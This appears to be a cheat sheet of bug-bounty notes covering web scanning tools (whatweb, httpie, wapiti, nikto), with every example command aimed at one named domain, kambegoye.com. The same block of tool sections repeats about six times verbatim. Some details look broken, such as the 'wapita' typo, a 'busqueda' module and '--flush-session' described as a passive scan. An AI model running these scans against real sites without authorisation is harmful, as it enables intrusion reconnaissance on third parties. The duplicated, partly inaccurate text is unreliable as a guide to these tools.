- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
